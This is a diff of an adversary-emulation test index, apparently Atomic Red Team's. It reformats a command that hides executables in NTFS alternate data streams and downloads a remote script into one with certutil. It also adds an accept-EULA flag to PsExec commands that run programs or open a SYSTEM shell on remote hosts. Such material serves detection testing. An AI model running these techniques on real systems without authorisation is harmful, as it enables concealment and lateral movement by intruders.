@@ -27100,17 +27100,15 @@ defense-evasion:
           type: path
           default: c:\ADS\
       executor:
-        command: |
-          type C:\temp\evil.exe > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"
-          extrac32 #{path}\procexp.cab #{path}\file.txt:procexp.exe
-          findstr /V /L W3AllLov3DonaldTrump #{path}\procexp.exe > #{path}\file.txt:procexp.exe
-          certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\temp:ttt
-          makecab #{path}\autoruns.exe #{path}\cabtest.txt:autoruns.cab
-          print /D:#{path}\file.txt:autoruns.exe #{path}\Autoruns.exe
-          reg export HKLM\SOFTWARE\Microsoft\Evilreg #{path}\file.txt:evilreg.reg
-          regedit /E #{path}\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey
-          expand \\webdav\folder\file.bat #{path}\file.txt:file.bat
-          esentutl.exe /y #{path}\autoruns.exe /d #{path}\file.txt:autoruns.exe /o
+        command: "type C:\\temp\\evil.exe > \"C:\\Program Files (x86)\\TeamViewer\\TeamViewer12_Logfile.log:evil.exe\"\nextrac32
+          #{path}\\procexp.cab #{path}\\file.txt:procexp.exe\nfindstr /V /L W3AllLov3DonaldTrump
+          #{path}\\procexp.exe > #{path}\\file.txt:procexp.exe\ncertutil.exe -urlcache
+          -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1
+          c:\\temp:ttt\nmakecab #{path}\\autoruns.exe #{path}\\cabtest.txt:autoruns.cab\nprint
+          /D:#{path}\\file.txt:autoruns.exe #{path}\\Autoruns.exe\nreg export HKLM\\SOFTWARE\\Microsoft\\Evilreg
+          #{path}\\file.txt:evilreg.reg\nregedit /E #{path}\\file.txt:regfile.reg
+          HKEY_CURRENT_USER\\MyCustomRegKey\nexpand \\\\webdav\\folder\\file.bat #{path}\\file.txt:file.bat\nesentutl.exe
+          /y #{path}\\autoruns.exe /d #{path}\\file.txt:autoruns.exe /o \n"
         name: command_prompt
         elevation_required: true
     - name: Store file in Alternate Data Stream (ADS)
@@ -40673,7 +40671,7 @@ execution:
           New-Item -ItemType Directory (Split-Path "#{psexec_exe}") -Force | Out-Null
           Copy-Item $env:TEMP\PsTools\PsExec.exe "#{psexec_exe}" -Force
       executor:
-        command: '#{psexec_exe} \\#{remote_host} "C:\Windows\System32\calc.exe"
+        command: '#{psexec_exe} \\#{remote_host} -accepteula "C:\Windows\System32\calc.exe"
 
 '
         name: powershell
@@ -42393,7 +42391,7 @@ lateral-movement:
           type: String
           default: "\\\\localhost"
       executor:
-        command: 'psexec.exe #{remote_host} -c #{command_path}
+        command: 'psexec.exe #{remote_host} -accepteula -c #{command_path}
 
 '
         name: command_prompt
@@ -43011,8 +43009,8 @@ lateral-movement:
           New-Item -ItemType Directory ("#{psexec_exe}") -Force | Out-Null
           Copy-Item $env:TEMP\PsTools\PsExec.exe "#{psexec_exe}" -Force
       executor:
-        command: "#{psexec_exe} \\\\#{computer_name} -u #{user_name} -p #{password}
-          -s cmd.exe\n"
+        command: "#{psexec_exe} \\\\#{computer_name} -accepteula -u #{user_name} -p
+          #{password} -s cmd.exe\n"
         name: command_prompt
     - name: Invoke-Command
       auto_generated_guid: 5295bd61-bd7e-4744-9d52-85962a4cf2d6
